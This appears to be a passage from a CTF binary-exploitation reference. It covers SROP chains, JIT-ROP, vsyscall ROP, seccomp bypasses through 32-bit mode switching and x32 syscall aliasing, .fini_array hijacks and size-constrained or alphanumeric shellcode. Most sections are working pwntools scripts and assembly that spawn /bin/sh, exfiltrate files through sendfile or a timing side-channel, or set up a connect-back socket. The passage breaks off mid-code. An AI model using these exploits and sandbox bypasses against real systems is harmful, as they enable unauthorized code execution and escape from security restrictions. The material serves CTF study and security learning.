**UTF-8 multi-byte spanning trick:** Register fields in the signal frame are 8 bytes each, packed contiguously. A 3-byte UTF-8 sequence can start in one field and end in the next:

```python
from pwn import *

# r15 is the field immediately before rdi in the sigframe
# rdi = pointer to "/bin/sh" = 0x2f9fb0 → bytes [B0, 9F, 2F,...]
# B0, 9F are UTF-8 continuation bytes (10xxxxxx) — invalid as sequence start
# Solution: set r15's last byte to 0xE0 (3-byte UTF-8 leader)
# E0 B0 9F = valid UTF-8 (U+0C1F) spanning r15→rdi boundary

frame = SigreturnFrame()
frame.rax = 59          # execve
frame.rdi = buf_addr + 0x178  # address of "/bin/sh\0"
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall_addr
frame.r15 = 0xE000000000000000  # Last byte 0xE0 starts 3-byte UTF-8 seq

# ROP preamble: 3 UTF-8-safe gadgets
payload = b'\x00' * 0x48           # padding to return address
payload += p64(pop_rax_ret)        # set rax = 15 (sigreturn)
payload += p64(15)
payload += p64(syscall_ret)        # trigger sigreturn
payload += bytes(frame)
# Place "/bin/sh\0" at offset 0x178 in BUFFER
```

**When to use:** Any exploit where payload bytes pass through UTF-8 validation (Rust `String`, `from_utf8`, JSON parsers). SROP minimizes the number of gadget addresses that must be UTF-8-safe.

**Key insight:** Multi-byte UTF-8 sequences (2-4 bytes) can span adjacent fields in structured data (signal frames, ROP chains). Set the leader byte (0xC0-0xF7) as the last byte of one field so continuation bytes (0x80-0xBF) in the next field form a valid sequence.

---

## Chained SROP (Multi-Frame Sigreturn Chain)

**Pattern:** Multiple `sigreturn` frames stored consecutively in memory. Each frame sets `rsp` to point at the *next* frame. Each frame sets `r15 = 0x0f` (so next `syscall` invocation triggers `rt_sigreturn`). Each frame performs one syscall. Allows building arbitrary syscall sequences without a gadget for every register.

**Setup:** Need a `syscall; ret` (or `syscall` alone) gadget. Each frame's `rip` points to it, and `r15 = 0x0f` is the mechanism to set `rax` for `rt_sigreturn` after the `syscall` instruction (in minimal binaries where `read()` return value = byte count flows into rax automatically).

```python
gadget = 0x000013370000004b  # syscall (in binary at fixed address, no PIE)

frame1 = SigreturnFrame(arch="amd64", kernel="amd64")
frame2 = SigreturnFrame(arch="amd64", kernel="amd64")
frame3 = SigreturnFrame(arch="amd64", kernel="amd64")

# Frame 1: socket(AF_INET=2, SOCK_STREAM=1, 0)
frame1.rax = 41
frame1.rdi = 2; frame1.rsi = 1; frame1.rdx = 0
frame1.rsp = base + frame2_offset  # chain to frame2
frame1.r15 = 0x0f                  # rt_sigreturn number (next read sets rax=0x0f)
frame1.rip = gadget

# Frame 2: connect(fd=result_from_frame1, sockaddr, 16)
frame2.rax = 42
frame2.rdi = 0                     # fd returned in rax by frame1, assign at runtime
frame2.rsi = base + sockaddr_offset
frame2.rdx = 16
frame2.rsp = base + frame3_offset  # chain to frame3
frame2.r15 = 0x0f
frame2.rip = gadget

# Frame 3: open(path, 0, 0)
frame3.rax = 2
frame3.rdi = base + path_offset
frame3.rsi = 0; frame3.rdx = 0
frame3.rsp = base + frame4_offset
frame3.r15 = 0x0f
frame3.rip = gadget

# Truncate frames to minimum needed size (reduce total payload size)
frame1 = bytes(frame1)[0:0xc0]
frame2 = bytes(frame2)[0:0xc0]
frame3 = bytes(frame3)[0:0xc0]

# Combined payload:
# p64(syscall) + frame1 + p64(syscall) + frame2 + sockaddr + p64(syscall) + frame3 + path
payload = p64(gadget) + frame1 + p64(gadget) + frame2 + sockaddr + p64(gadget) + frame3 + path
# Pad to exactly (payload_length_as_rax_value) so the first read sets rax = sigreturn
payload = payload.ljust(0x40f, b'\x00')  # 0xf = rt_sigreturn
p.sendafter('...', payload)
```

**Key insight:** Each frame is prefixed by `p64(gadget)` which is the return address after the previous `syscall` returns. The previous `read()` or similar call returned `N` bytes = `rax`, so set total payload length = `N` where `N` is the desired syscall number. For `rt_sigreturn` = 15 (0x0f), pad payload to exactly 15 bytes. For a chain, control `rax` for each frame by controlling the byte count sent. Truncating `SigreturnFrame` to 0xc0 saves space since `rip`, `rsp`, and registers are near the start.

**When to use:** Minimal binary with only `syscall` gadget and no `pop rax` or libc. Maximum syscall complexity from minimal gadget set. Especially effective with connect-back exfil (socket → connect → open → getdents/sendfile → write to socket).

---

## Sendfile SROP and Payload-Length-as-rax

**Pattern:** In position-independent or gadget-scarce environments, `read()` returns the number of bytes read in `rax`. By controlling exactly how many bytes you send, you set `rax` for the *next* syscall without a `pop rax` gadget.

**sendfile for flag exfiltration without shell:**
```python
# sendfile(out_fd=1, in_fd=flag_fd, offset=0, count=512)
# syscall 40 (0x28) on x86-64
frame = SigreturnFrame(arch="amd64", kernel="amd64")
frame.rax = 40          # sendfile
frame.rdi = 1           # stdout (or socket fd)
frame.rsi = 5           # flag file fd (open separately or known)
frame.rdx = 0           # offset
frame.r10 = 512         # count
frame.rsp = 0x400800    # arbitrary stack (will crash after, don't care)
frame.rip = 0x40009b    # syscall gadget

frame = bytes(frame)[0:0xd0]

# Use payload length to set rax=15 (rt_sigreturn) for the sigreturn frame
payload = p64(sigreturn_trigger) + frame
payload = payload.ljust(15, b'\x00')   # exactly 15 bytes → rax=15 after read()
p.send(payload)
```

**Payload-length-as-rax trick in minimal stubs:**
```python
# Pattern for tiny binaries: read(0, stack, N) → rax=N → use N as syscall number
# To do openat (257=0x101):
payload = p64(gadget) + frame_openat
payload = payload.ljust(257, b'\x00')  # send 257 bytes → rax=257=openat

# To do rt_sigreturn (15):
payload = payload.ljust(15, b'\x00')   # send 15 bytes → rax=15

# To do sendfile (40):
payload = payload.ljust(40, b'\x00')
```

**Multi-step example (no pop rax, just syscall gadget):**
```python
# Step 1: read 257 bytes (openat = 257) → opens flag file
p.send(openat_payload.ljust(257, b'\x00'))

# Step 2: read 15 bytes (rt_sigreturn = 15) → sigreturn into sendfile frame
p.send(sigreturn_trigger.ljust(15, b'\x00'))

# Flag arrives via sendfile(stdout, flag_fd, ...)
flag = p.recv(128)
```

**Key insight:** In a loop `read → syscall → loop`, each `read` sets `rax` to byte count. Choose the byte count equal to the target syscall number. Works reliably when: (1) the binary loops back to `read`, (2) no other code modifies `rax` between the `read` return and the `syscall` instruction, and (3) the syscall is idempotent enough to survive partial control of args.

---

## JIT-ROP: Scan for syscall Byte in Leaked libc Function

**Pattern:** Instead of identifying the remote libc version to find gadgets, leak a GOT entry (e.g., `read@GOT`), then read the machine code of that function to find a `syscall` instruction within it. Use the `read()` return value to control `rax` for the syscall number.

**Exploitation:**
```python
from pwn import *

# Step 1: Leak read@GOT address via format string / arbitrary read
read_addr = leak_got(elf.got['read'])
log.info(f"read() @ {hex(read_addr)}")

# Step 2: Read bytes within read() function body
# Use an arbitrary read primitive (e.g., format string %s, or read() itself)
read_bytes = read_memory(read_addr, 0x100)

# Step 3: Find syscall opcode (0x0f 0x05) within read()
syscall_offset = read_bytes.index(b'\x0f\x05')
syscall_addr = read_addr + syscall_offset
log.info(f"syscall @ {hex(syscall_addr)}")

# Step 4: Overwrite an unused GOT entry (e.g., srand) with syscall address
write_got(elf.got['srand'], syscall_addr)

# Step 5: Build ROP chain for execve via syscall
# Trick: read() return value sets rax, so read exactly 59 bytes for __NR_execve
pop_rdi = rop_gadget  # pop rdi; ret
pop_rsi = rop_gadget  # pop rsi; ret
pop_rdx = rop_gadget  # pop rdx; ret

payload = flat(
    pop_rdi, 0,                    # fd = stdin
    pop_rsi, bss_addr,             # buf = writable BSS
    pop_rdx, 59,                   # count = 59 = __NR_execve
    elf.plt['read'],               # read(0, bss, 59) → rax = 59
    pop_rdi, binsh_addr,           # rdi = "/bin/sh"
    pop_rsi, 0,                    # rsi = NULL
    pop_rdx, 0,                    # rdx = NULL
    elf.plt['srand'],              # calls syscall
    # rax=59, rdi="/bin/sh", rsi=0, rdx=0 → execve("/bin/sh", NULL, NULL)
)
io.sendline(payload)

# Send exactly 59 bytes so read() returns 59 (sets rax = __NR_execve)
io.send(b'A' * 59)
```

**Why read() always contains syscall:**
```text
read() in libc is a thin wrapper around the syscall instruction:
  mov eax, 0; SYS_read
  syscall; <- this is what we're scanning for
  cmp rax, -4096...
The bytes 0x0f 0x05 (syscall) are guaranteed to exist within read()
```

**Key insight:** Every libc function's code section contains useful gadgets. `read()` always contains a `syscall` instruction internally. By leaking a GOT entry and reading the function's machine code, you find `syscall` without knowing the libc version. The `read()` syscall return value conveniently sets `rax` to the number of bytes read — send exactly 59 bytes (`__NR_execve`) to set up the syscall number. This eliminates the need for a `pop rax; ret` gadget.

**When to recognize:** Partial RELRO (GOT writable), no libc version available, but you can leak GOT entries and read arbitrary memory. Any function that performs a syscall internally (`read`, `write`, `open`, `mmap`) contains the `0f 05` bytes. `read()` is preferred because its return value naturally controls `rax`.

---

## Vsyscall ROP for PIE Bypass

On older Linux kernels, vsyscall page is mapped at a fixed address (`0xffffffffff600000-0xffffffffff601000`) regardless of ASLR/PIE. Each vsyscall entry ends with `ret`, providing gadgets at known addresses:

- `0xffffffffff600000` — gettimeofday (ret at +0x9)
- `0xffffffffff600400` — time (ret at +0x9)
- `0xffffffffff600800` — getcpu (ret at +0x9)

Use vsyscall `ret` gadgets to slide the stack to a partial return address overwrite:

```python
from pwn import *

payload = b'A' * 72                      # padding to return address
payload += p64(0xffffffffff600400)        # vsyscall time: acts as NOP-ret
payload += p64(0xffffffffff600400)        # second NOP-ret for alignment
payload += b"\x8b\x10"                    # partial overwrite to target (2 bytes)
```

**Key insight:** Vsyscall addresses are fixed even with PIE+ASLR. Modern kernels emulate vsyscalls (trap to kernel), but the addresses remain predictable. Check with `cat /proc/self/maps | grep vsyscall`.

**Note:** Some newer kernels disable vsyscall entirely (`vsyscall=none`). Verify availability before relying on this technique.

---

## Seccomp Bypass

Alternative syscalls when seccomp blocks `open()`/`read()`:
- `openat()` (257), `openat2()` (437, often missed!), `sendfile()` (40), `readv()`/`writev()`

**Check rules:** `seccomp-tools dump ./binary`

### RETF Architecture Switch for Seccomp Bypass

**Pattern:** Seccomp blocks `execve`, `execveat`, `open`, `openat` in 64-bit mode. Switch to 32-bit (IA-32e compatibility mode) where syscall numbers differ and the filter does not apply.

**How it works:** The `retf` (far return) instruction pops RIP then CS from the stack. Setting `CS = 0x23` switches the CPU to 32-bit compatibility mode. In 32-bit mode, `int 0x80` uses different syscall numbers: `open=5`, `read=3`, `write=4`, `exit=1`.

**ROP chain to switch modes:**
```python
POP_RDX_RBX = libc_base + 0x8f0c5  # pop rdx; pop rbx; ret
POP_RDI     = 0x4013a5
POP_RSI_R15 = 0x4013a3
RETF        = libc_base + 0x294bf   # retf gadget in libc

# Step 1: mprotect BSS as RWX for shellcode
rop  = flat(POP_RDI, 0x404000)          # addr = BSS page
rop += flat(POP_RSI_R15, 0x1000, 0)     # size = page
rop += flat(POP_RDX_RBX, 7, 0)          # prot = RWX
rop += flat(libc_base + libc.sym.mprotect)

# Step 2: Far return to 32-bit shellcode on BSS
rop += flat(RETF)
rop += p32(0x404a80)   # 32-bit EIP (shellcode address on BSS)
rop += p32(0x23)        # CS = 0x23 (IA-32e compatibility mode)
```

**32-bit shellcode (open/read/write flag):**
```nasm
mov esp, 0x404100; set up 32-bit stack
push 0x67616c66; "flag" (reversed)
push 0x2f2f2f2f; "////"
mov ebx, esp; ebx = filename pointer

mov eax, 5; SYS_open (32-bit)
xor ecx, ecx; O_RDONLY
int 0x80; open("////flag", O_RDONLY)

mov ebx, eax; fd from open
mov ecx, esp; buffer
mov edx, 0x100; size
mov eax, 3; SYS_read (32-bit)
int 0x80

mov edx, eax; bytes read
mov ecx, esp; buffer
mov ebx, 1; stdout
mov eax, 4; SYS_write (32-bit)
int 0x80

mov eax, 1; SYS_exit
int 0x80
```

**Key insight:** Seccomp filters configured for `AUDIT_ARCH_X86_64` do not check 32-bit `int 0x80` syscalls. The `retf` gadget (found in libc) switches architecture by loading CS=0x23. Requires making a memory region executable first via `mprotect`, since 32-bit shellcode must run from writable+executable memory.

**Finding retf in libc:**
```bash
ROPgadget -binary libc.so.6 | grep retf
# Or search for byte 0xcb:
objdump -d libc.so.6 | grep -w retf
```

**When to use:** Seccomp blocks critical 64-bit syscalls (`open`, `openat`, `execve`) but does not use `SECCOMP_FILTER_FLAG_SPEC_ALLOW` or check `AUDIT_ARCH`. Combine with `mprotect` to make BSS/heap executable for the 32-bit shellcode.

### x32 ABI Syscall Number Aliasing for Seccomp Bypass

**Pattern:** Linux x32 ABI (32-bit pointers on 64-bit kernel) uses syscall numbers with bit 30 set (`0x40000000`). Most seccomp BPF filters only check the low 32 bits against known syscall numbers, missing the x32 variants.

```c
// Standard execve blocked by seccomp: syscall 59
// x32 ABI variant: syscall 0x40000000 | 59 = 0x4000003B
// Often passes through BPF filters that check for exact match on 59
syscall(0x4000003B, "/bin/sh", NULL, NULL);
```

```python
from pwn import *

# ROP chain using x32 ABI syscall number to bypass seccomp
pop_rax = libc_base + rax_gadget
pop_rdi = libc_base + rdi_gadget
pop_rsi = libc_base + rsi_gadget
pop_rdx = libc_base + rdx_gadget
syscall_ret = libc_base + syscall_gadget

rop = flat(
    pop_rax, 0x4000003B,              # x32 execve (bypasses seccomp)
    pop_rdi, binsh_addr,              # "/bin/sh"
    pop_rsi, 0,                       # argv = NULL
    pop_rdx, 0,                       # envp = NULL
    syscall_ret,                      # trigger x32 execve
)
```

**Key insight:** The x32 ABI ORs `0x40000000` into syscall numbers. Seccomp filters checking for `SCMP_ACT_KILL` on `__NR_execve` (59) miss `__NR_execve | __X32_SYSCALL_BIT` (0x4000003B), which the kernel still dispatches to the same handler. This works on kernels compiled with `CONFIG_X86_X32=y` (common on older distributions).

**When to recognize:** Seccomp filter blocks specific syscall numbers via exact match or range check. Dump the BPF with `seccomp-tools dump ./binary` and check whether it validates the `AUDIT_ARCH` or masks off the x32 bit before comparing. If neither, x32 aliasing bypasses the filter.

**Mitigation check:** Modern seccomp policies use `SECCOMP_RET_KILL_PROCESS` and verify `AUDIT_ARCH_X86_64` explicitly, blocking this technique.

---

## Time-Based Blind Shellcode When write() Blocked

**Pattern:** When seccomp blocks all output syscalls (`write`, `sendto`, `writev`), use a timing side-channel to exfiltrate flag data character-by-character: compare each byte against a guess, loop on match.

```nasm; Read flag into buffer, then compare character N; Assumes flag has been read into rsi via allowed read() syscall
mov al, [rsi + N]; flag byte N
cmp al, 0x41; compare with guess 'A'
jne done; skip if no match; Timing loop: burns ~4 seconds on match
xor ecx, ecx.loop: inc ecx
cmp ecx, 0xffffffff
jne.loop
done: xor edi, edi
mov eax, 60; exit
syscall
```

```python
from pwn import *
import time

FLAG_LEN = 40
CHARSET = string.printable

def guess_byte(offset, guess_char):
    """Send shellcode that delays if flag[offset] == guess_char"""
    sc = shellcraft.amd64.linux.open("flag.txt", 0)
    sc += shellcraft.amd64.linux.read("rax", "rsp", 100)
    sc += f"""
        mov al, byte ptr [rsp + {offset}]
        cmp al, {ord(guess_char)}
        jne done
        xor ecx, ecx
    loop:
        inc ecx
        cmp ecx, 0xffffffff
        jne loop
    done:
        xor edi, edi
        mov eax, 60
        syscall
    """
    r = remote(host, port)
    r.send(asm(sc))
    start = time.time()
    try:
        r.recvall(timeout=6)
    except:
        pass
    elapsed = time.time() - start
    r.close()
    return elapsed > 3.0  # Match if response took > 3 seconds

flag = ""
for i in range(FLAG_LEN):
    for c in CHARSET:
        if guess_byte(i, c):
            flag += c
            print(f"Flag so far: {flag}")
            break
```

**Key insight:** When seccomp blocks all output syscalls (`write`, `sendto`, `writev`), a flag byte can still be exfiltrated by comparing it against a guessed value and burning CPU time on match. The response time difference (instant vs ~4 seconds) reveals whether the guess was correct. Requires up to 256 * flag_length connections worst case, but printable ASCII reduces this to ~95 * flag_length.

**When to recognize:** Seccomp allows `open`/`read` but blocks all write-family syscalls. Also applicable when the binary has no output path at all.

---

## .fini_array Hijack

**When to use:** Writable `.fini_array` + arbitrary write primitive. When `main()` returns, entries called as function pointers. Works even with Full RELRO.

```python
# Find .fini_array address
fini_array = elf.get_section_by_name('.fini_array').header.sh_addr
# Or: objdump -h binary | grep fini_array

# Overwrite with format string %hn (2-byte writes)
writes = {
    fini_array: target_addr & 0xFFFF,
    fini_array + 2: (target_addr >> 16) & 0xFFFF,
}
```

**Advantages over GOT overwrite:** Works even with Full RELRO (`.fini_array` is in a different section). Especially useful when combined with RWX regions for shellcode.

### _fini_array Double-Entry Staged ROP

**Pattern:** Statically-linked binary has no PLT/GOT to hijack. However, `_fini_array` stores pointers called on `exit()`. Overwrite both entries so the first invocation runs `do_overwrite` (a gadget that lets you stage more bytes) and the second runs it again, letting you append ROP piece-by-piece across successive exits.

```text
_fini_array[0] = do_overwrite   # stage 1: write next segment
_fini_array[1] = do_overwrite   # stage 2: write final segment + trigger
```

Use `add rsp, N; ret` pivots to walk below the current `rsp` so each stage concatenates onto the previous ROP frame.

**Key insight:** `_fini_array` is effectively a re-entrant callback table in static binaries. Two entries plus any "write N bytes to addr" primitive gives you unlimited ROP depth without restarting the process.

### DT_FINI_ARRAY Hijack via Linker Overwrite

**Pattern:** Dynamically-linked binary with write-what-where primitive. Overwrite `l->l_info[DT_FINI_ARRAY]` in the linker's `link_map` structure to point to a controlled memory region containing a fake `fini_array` entry that calls a onegadget or shellcode.

**Linker structure:**
- `link_map` (pointed by GOT[1] in PIE binaries) contains `l_info[DT_FINI_ARRAY]` at offset ~0x13b0
- `l_info[DT_FINI_ARRAY]->d_un.d_ptr` is the offset from `l->l_addr` to the `fini_array` table
- On exit, `_dl_fini()` calls functions in the `fini_array`: `((fini_t) array[i])()`

**Exploitation:**
1. Leak linker base address via format string or other leak
2. Write controlled address to `l_info[DT_FINI_ARRAY]` (e.g., .bss or stack variable)
3. Forge fake `fini_array` structure at controlled address:
   ```python
   fake_fini = p64(onegadget) + p64(0)  # function pointer + padding
   ```
4. Ensure `l_info[DT_FINI_ARRAY]->d_un.d_ptr` points to the fake array offset from `l->l_addr`
5. Program exit triggers `_dl_fini()` → calls onegadget

**Code example:**
```python
# Leak rtld_global base
rtld_base = leak_via_format('%21$p')

# Overwrite l_info[DT_FINI_ARRAY]
target_addr = rtld_base + 0x13b0  # DT_FINI_ARRAY offset
controlled_addr = exe.bss + 0x50  # .bss variable

# Write fake fini_array to controlled_addr
fake_array = p64(onegadget) + p16(offset_to_fake)  # onegadget + offset

# Trigger on exit
write_primitive(target_addr, controlled_addr)
```

**Requirements:**
- Write-what-where primitive
- Ability to leak linker base
- Controlled memory for fake array
- Program exit path calls `_dl_fini`

**Key insight:** Linker's `fini_array` processing provides arbitrary function execution without GOT/PLT hijack. Works on glibc 2.35+ where some other techniques are mitigated.

---

## DynELF Automated Libc Discovery

When the remote libc version is unknown, use pwntools' `DynELF` to resolve function addresses at runtime by leaking memory through a format string or read primitive.

```python
from pwn import *

elf = ELF('./target')
io = remote

# Define a leak function that reads memory at a given address
def leak(addr):
    payload = b'A' * offset
    payload += p64(elf.plt['printf'])  # call printf to leak
    payload += p64(main_addr)          # return to main for next leak
    payload += p64(addr)               # argument: address to read
    io.sendline(payload)
    data = io.recvuntil(b'prompt', drop=True)
    return data

# DynELF resolves symbols by parsing ELF structures in memory
d = DynELF(leak, elf=elf)
system_addr = d.lookup('system', 'libc')
binsh_addr = d.lookup(None, 'libc')  # search for "/bin/sh" string

log.success(f"system @ {hex(system_addr)}")

# Build final ROP chain with resolved addresses
payload = b'A' * offset
payload += p64(pop_rdi_ret)
payload += p64(binsh_addr)
payload += p64(system_addr)
io.sendline(payload)
io.interactive()
```

**Key insight:** DynELF parses the remote ELF's `.dynamic` section, link map, and symbol tables to resolve any libc function without knowing the libc version. Requires a reliable memory read primitive (leak function) that can read arbitrary addresses.

---

## Stack Shellcode with Input Reversal

**Pattern:** Binary reverses input buffer before returning.

**Strategy:**
1. Leak address via info-leak command (bypass PIE)
2. Find `sub rsp, 0x10; jmp *%rsp` gadget
3. Pre-reverse shellcode and RIP overwrite bytes
4. Use partial 6-byte RIP overwrite (avoids null bytes from canonical addresses)
5. Place trampoline (`jmp short`) to hop back into NOP sled + shellcode

**Null-byte avoidance with `scanf("%s")`:**
- Can't embed `\x00` in payload
- Use partial pointer overwrite (6 bytes) - top 2 bytes match since same mapping
- Use short jumps and NOP sleds instead of multi-address ROP chains

---

## Constrained Shellcode in Small Buffers

When shellcode space is severely limited (e.g., 15-16 bytes due to AES block size), use minimal register setup and avoid unnecessary instructions.

```asm; 15-byte execve("/bin/sh") shellcode for x86-64; Assumes: rsp points to writable area, "/bin/sh\0" follows shellcode on stack; Written in fasm syntax:

lea rdi, [rsp + 0x19]; 4 bytes - pointer to "/bin/sh" on stack
cdq; 1 byte  - rdx = 0 (envp = NULL)
push rdx; 1 byte  - NULL terminator for argv
push rdi; 1 byte  - argv[0] = "/bin/sh"
push rsp; 1 byte
pop rsi; 1 byte  - rsi = argv = {"/bin/sh", NULL}
push 0x3b; 2 bytes - syscall number for execve
pop rax; 1 byte  - rax = 59
syscall; 2 bytes - execve("/bin/sh", argv, NULL); Total: 15 bytes; When AES-CBC is involved, craft IV to XOR-decrypt shellcode block:; crafted_iv = AES_decrypt(known_ciphertext) XOR shellcode
```

**Key insight:** The `cdq` instruction (1 byte) zero-extends eax into edx, and `push reg; pop reg` pairs (2 bytes) replace `mov` (3 bytes). For AES-block-constrained shellcode, compute the IV that decrypts to your shellcode by XORing `AES_decrypt(ciphertext_block)` with the desired shellcode.

---

## Minimal Shellcode with Pre-Initialized Registers

**Pattern:** When the shellcode entry point has registers already initialized to useful values (e.g., `eax=4` for the `write` syscall on x86-32, `ebx=1` for stdout), exploit them to dramatically reduce shellcode size. Always audit register state at entry before writing shellcode from scratch.

**Example (x86-32 write syscall, entry: eax=4, ebx=1):**
```asm; Entry state: eax=4 (sys_write), ebx=1 (stdout fd); Goal: write flag buffer to stdout — only need ecx and edx; 3-byte: point ecx at the flag buffer
lea ecx, [edi + flag_offset]; 3 bytes (if offset fits in 1 byte); 2-byte: set edx (byte count)
mov dl, 64; 2 bytes; 2-byte: trigger syscall
int 0x80; 2 bytes; Total: 7 bytes — or as few as 5 if edx is already set
```

**Workflow:**
```python
# 1. Run the binary in gdb, break right before shellcode is executed
# 2. Inspect all registers: info registers
# 3. Identify which syscall arguments are already set
# 4. Write only the instructions needed to fill missing arguments

# Useful pre-initialized patterns:
# - eax = syscall number already set by caller
# - ebx = fd (stdin=0, stdout=1) from prior open/setup
# - rdi, rsi from calling convention leakage
# - rsp pointing into a writable region (for push-based addressing)
```

**Key insight:** Always audit entry register values before writing shellcode — pre-loaded syscall numbers and fd values can reduce shellcode to under 6 bytes. The smallest possible shellcode exploits the ABI calling convention residue left by the surrounding code.

---

## Unique-Byte Shellcode via syscall RIP to RCX

**Pattern:** x86-64 `syscall` instruction saves `RIP` (next instruction address) into `RCX` as a side effect. An 8-byte stager exploits this: execute `syscall` (which also triggers a `read` with pre-set registers), then use `rcx` (now = address of the instruction after `syscall`) as the address for reading the full shellcode to the same RWX location. All 8 bytes of the stager must be unique (no repeated bytes).

**8-byte stager construction:**
```asm; Entry constraints: rax=0 (read), rdi=0 (stdin), rsi=shellcode_buf, rdx=8 (small); Side effect of syscall: rcx = RIP (address of next instruction after syscall)

syscall; 2 bytes: 0f 05 — executes read(0, shellcode_buf, 8);           and sets rcx = &next_instr (= shellcode_buf + 2)
push rcx; 1 byte:  51 — stack = [shellcode_buf + 2]
pop rsi; 1 byte:  5e — rsi = shellcode_buf + 2 (where full shellcode goes)
xor edx, edx; 2 bytes: 31 d2 — clear rdx
mov dl, 100; 2 bytes: b2 64 — rdx = 100 (read size for stage 2); Back to syscall (loop): the push/pop sequence ends up jumping to syscall again;... or arrange entry so the next syscall reads 100 bytes to rsi
```

**Uniqueness constraint:**
```python
# All 8 bytes must be distinct (challenge-specific filter)
# Candidate sequence: 0f 05 51 5e 31 d2 b2 64  — all unique
# Verify: len(set(bytes)) == len(bytes)
stager = bytes([0x0f, 0x05, 0x51, 0x5e, 0x31, 0xd2, 0xb2, 0x64])
assert len(set(stager)) == len(stager)  # passes

# Stage 2: full execve shellcode sent to stdin after stager runs first syscall
from pwn import *
p.send(stager)
p.send(asm(shellcraft.sh()))
```

**Key insight:** x86-64 `syscall` copies RIP to RCX — weaponize this as position-independent address discovery for tiny shellcode stagers. The stager needs no hardcoded addresses: it calculates its own location via the `syscall` side effect, then uses that address as the destination for reading the full payload.

---

## Alphanumeric Shellcode Bootstrap via push/pop When rax=0

**Pattern:** RWX page receives attacker shellcode but every byte must be alphanumeric (`[0-9A-Za-z]`). Tools like [basic-amd64-alphanumeric-shellcode-encoder](https://github.com/veritas501/basic-amd64-alphanumeric-shellcode-encoder) emit self-decoding stubs but require `rax + padding_len == shellcode_address` at entry. When the harness enters with `rax = 0` (not anywhere near the shellcode) the encoder has nothing to land on. Prepend a tiny 3-byte non-alnum-but-accepted seed — `push r12; pop rax` — so `rax` becomes a live stack/code pointer, then call the encoder with `padding_len=3`.

```python
from pwn import *
context(arch='amd64')

file_name = "flag".ljust(8, '\x00')
sc = '''
    mov rax, %s
    push rax
    mov rdi, rsp
    mov rax, 2          /* open(rsp, 0) */
    mov rsi, 0
    syscall
    mov rdi, rax
    sub rsp, 0x20
    mov rsi, rsp
    mov rdx, 0x20
    mov rax, 0          /* read(fd, rsp, 0x20) */
    syscall
    mov rdi, 0
    mov rsi, rsp
    mov rdx, 0x20
    mov rax, 1          /* write(1, rsp, 0x20) */
    syscall
''' % hex(u64(file_name))
sc = asm(sc)

# push r12 (0x41 0x54) + pop rax (0x58) = 3 bytes, all happen to be alnum-safe
bootstrap = asm("push r12; pop rax;")
payload = bootstrap + alphanum_encoder(sc, 3)
```

**Key insight:** Alphanumeric-only decoders typically need `rax` to point at (or a fixed offset before) the payload. If the harness zeroes `rax`, seed it from *any* volatile register that already holds a valid address — `r12` is routinely `_start` on Linux, and `push r12; pop rax` happens to be `AT X` (0x41 0x54 0x58), which the encoder's input filter treats as benign. Adjust the encoder's `padding_len` argument to exactly match the prepended byte count so the decode math still lines up.

---

## stub_execveat Syscall as execve Alternative

**Pattern:** In a tiny binary with only `read` syscall and no `pop rax` gadget, use `stub_execveat` (syscall 0x142/322) instead of `execve` (0x3b). Since `read()` returns bytes-read in `rax`, make total input length exactly 0x142 bytes so `rax=0x142` when the syscall gadget fires.

**Why this works:**
1. The binary is tiny - only `read` and basic gadgets, no `pop rax; ret`
2. `execve` requires `rax=0x3b` (59), but without `pop rax` there's no way to set it
3. `read()` returns the number of bytes read in `rax` - this is the only rax control
4. `stub_execveat` (syscall 322 = 0x142) accepts the same arguments as `execve` when `AT_FDCWD` is used for the directory fd
5. Send exactly 0x142 bytes so `read()` returns 0x142, then hit `syscall`

```python
from pwn import *

# Binary gadgets (tiny static binary)
xor_rdx_syscall = 0x4000ed   # xor rdx, rdx; syscall
syscall_gadget  = 0x400101   # syscall

# Build payload: /bin/sh string + padding + ROP chain
# Total length must be exactly 0x142 bytes
payload  = b"/bin/sh\x00"                          # rdi points here
payload += b"B" * (0x148 - (8*4) - 8)              # padding to ROP area
payload += p64(xor_rdx_syscall)                     # xor rdx, rdx; syscall
payload += p64(syscall_gadget)                      # syscall (rax=0x142 from read)
payload += b"A" * (0x142 - len(payload) - 1)        # pad to exactly 0x142 bytes
# rax = 0x142 from read() return value = stub_execveat syscall number

io = remote('target', 1337)
io.send(payload)
io.interactive()
```

**Key insight:** `stub_execveat` (syscall 322/0x142) accepts the same arguments as execve when `AT_FDCWD` is used, but its higher syscall number can be reached via `read()` return value when `pop rax; ret` gadgets are unavailable. Always check if alternative syscalls with equivalent functionality have numbers reachable through return values or other implicit register control.

---

## Stack Canary XOR Epilogue as RDX Zeroing Gadget

**When to use:** Need `rdx = 0` for `execve(path, argv, NULL)` but no `pop rdx; ret` gadget exists in the binary. The canary verification epilogue `xor rdx, fs:28h` zeros RDX when the canary is intact.

```python
from pwn import *

# Canary check epilogue (found in most binaries):
# mov rdx, [rsp+8]; load canary from stack
# xor rdx, fs:28h; XOR with stored canary → 0 if intact
# Jump into this code as a "gadget" to zero RDX

# Find the canary check sequence in the binary
canary_xor_gadget = next(binary.search(asm(
    "mov rdx, [rsp+8]; xor rdx, qword ptr fs:[0x28]"
)))
# Side effect: harmless write of je result, rdx = 0 for execve(path, argv, NULL)

# Use in ROP chain:
rop = flat(
    pop_rdi, binsh_addr,          # rdi = "/bin/sh"
    pop_rsi, 0,                   # rsi = NULL (argv)
    canary_xor_gadget,            # rdx = canary ^ fs:28h = 0
    execve_addr,                  # execve("/bin/sh", NULL, NULL)
)
```

**Key insight:** The stack canary check `xor rdx, fs:28h` produces `rdx=0` when the canary is correct. Jump into this epilogue as a gadget when `pop rdx` is unavailable - it provides a reliable zero-rdx primitive with only a benign byte-write side effect. This works because the canary on the stack matches `fs:28h`, so the XOR result is always zero in a non-corrupted frame.

**When to recognize:** ROP chain needs `rdx=0` (common for `execve` third argument) but the binary lacks `pop rdx; ret` or `pop rdx; pop rbx; ret`. Search for `xor rdx, qword ptr fs:` in the binary's disassembly - it appears in every function with a stack canary.

---

## getdents64 in Shellcode (Directory Listing Without Shell)

**Pattern:** When you have shellcode execution but no shell available (restricted exec, orw-only seccomp), use `getdents64` (syscall 217) to enumerate directory contents and write the raw `linux_dirent64` structs to stdout or a socket.

```asm
; getdents64(fd, buf, count) → writes raw linux_dirent64 structs
push 3          ; fd = 3 (already-open directory fd, or just opened)
pop rdi
mov edx, 0x1000  ; count
mov rsi, rsp
sub rsi, rdx     ; buf = sp - 0x1000
push 0xd9        ; 217 = getdents64
pop rax
syscall

; write result to stdout
push 1
pop rdi
mov edx, eax    ; write however many bytes getdents64 returned
push 1
pop rax
syscall

push 60
pop rax
syscall         ; exit
```

```python
shellc = asm('''
  push 3
  pop rdi
  mov edx, 0x1000
